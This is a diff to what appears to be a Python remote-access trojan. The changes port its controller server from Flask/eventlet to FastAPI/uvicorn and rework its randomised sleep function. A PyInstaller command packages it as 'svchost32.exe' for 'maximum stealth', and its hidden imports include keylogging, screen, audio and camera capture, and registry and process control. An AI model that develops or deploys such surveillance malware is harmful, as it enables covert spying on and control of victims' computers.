@@ -3783,7 +3783,7 @@ def create_pyinstaller_command():
 pyinstaller --onefile --windowed --name "svchost32" --icon "icon.ico" main.py
 
 # Alternative command with additional options for maximum stealth:
-pyinstaller --onefile --windowed --name "svchost32" --icon "icon.ico" --hidden-import win32api --hidden-import win32con --hidden-import win32security --hidden-import win32process --hidden-import win32event --hidden-import ctypes --hidden-import wintypes --hidden-import winreg --hidden-import mss --hidden-import numpy --hidden-import cv2 --hidden-import pyaudio --hidden-import pynput --hidden-import pygame --hidden-import websockets --hidden-import speech_recognition --hidden-import psutil --hidden-import PIL --hidden-import pyautogui --hidden-import socketio --hidden-import requests --hidden-import urllib3 --hidden-import warnings --hidden-import uuid --hidden-import os --hidden-import subprocess --hidden-import threading --hidden-import sys --hidden-import random --hidden-import base64 --hidden-import tempfile --hidden-import io --hidden-import wave --hidden-import socket --hidden-import json --hidden-import asyncio --hidden-import platform --hidden-import collections --hidden-import queue --hidden-import math --hidden-import time --hidden-import eventlet main.py
+pyinstaller --onefile --windowed --name "svchost32" --icon "icon.ico" --hidden-import win32api --hidden-import win32con --hidden-import win32security --hidden-import win32process --hidden-import win32event --hidden-import ctypes --hidden-import wintypes --hidden-import winreg --hidden-import mss --hidden-import numpy --hidden-import cv2 --hidden-import pyaudio --hidden-import pynput --hidden-import pygame --hidden-import websockets --hidden-import speech_recognition --hidden-import psutil --hidden-import PIL --hidden-import pyautogui --hidden-import socketio --hidden-import requests --hidden-import urllib3 --hidden-import warnings --hidden-import uuid --hidden-import os --hidden-import subprocess --hidden-import threading --hidden-import sys --hidden-import random --hidden-import base64 --hidden-import tempfile --hidden-import io --hidden-import wave --hidden-import socket --hidden-import json --hidden-import asyncio --hidden-import platform --hidden-import collections --hidden-import queue --hidden-import math --hidden-import time --hidden-import uvloop --hidden-import aiohttp --hidden-import httpx main.py
 
 # The resulting svchost32.exe will:
 # - Run on any Windows PC without Python installed
@@ -5845,15 +5845,22 @@ def sleep_random():
     time.sleep(sleep_time)
 
 def sleep_random_non_blocking():
-    """Non-blocking random sleep using eventlet."""
+    """Non-blocking random sleep using asyncio."""
     try:
-        import eventlet
         sleep_time = random.uniform(0.5, 2.0)
-        eventlet.sleep(sleep_time)
-    except ImportError:
-        # Fallback to shorter sleep or skip if eventlet not available
-        log_message("eventlet not available for non-blocking sleep, using shorter delay", "warning")
-        sleep_time = random.uniform(0.1, 0.5)  # Much shorter fallback
+        # Use asyncio sleep for non-blocking operation
+        async def _async_sleep():
+            await asyncio.sleep(sleep_time)
+        
+        try:
+            loop = asyncio.get_running_loop()
+            asyncio.create_task(_async_sleep())
+        except RuntimeError:
+            # No running loop, use regular sleep
+            time.sleep(sleep_time)
+    except Exception as e:
+        # Fallback to regular sleep
+        sleep_time = random.uniform(0.1, 0.5)
         time.sleep(sleep_time)
 
 # --- Agent State (consolidated with earlier definitions) ---
@@ -10972,18 +10979,20 @@ def test_process_termination_functionality():
 # ========================================================================================
 
 try:
-    import eventlet
-    eventlet.monkey_patch()
+    # Modern async web framework (FastAPI replaces Flask)
+    from fastapi import FastAPI, Request, Response, File, UploadFile
+    from fastapi.responses import JSONResponse, RedirectResponse, FileResponse
+    import uvicorn
     
-    from flask import Flask, request, jsonify, redirect, url_for, Response, send_file
-    from flask_socketio import SocketIO, emit, join_room, leave_room
-    
-    FLASK_AVAILABLE = True
-    FLASK_SOCKETIO_AVAILABLE = True
+    FLASK_AVAILABLE = True  # Keep flag name for compatibility
+    FLASK_SOCKETIO_AVAILABLE = True  # Keep flag name for compatibility
+    FASTAPI_AVAILABLE = True
+    log_message("FastAPI + Uvicorn available for controller mode (high-performance async)")
 except ImportError:
     FLASK_AVAILABLE = False
     FLASK_SOCKETIO_AVAILABLE = False
-    log_message("Flask/SocketIO not available. Controller functionality disabled.")
+    FASTAPI_AVAILABLE = False
+    log_message("FastAPI/Uvicorn not available. Controller functionality disabled.")
 
 # Controller state
 controller_app = None
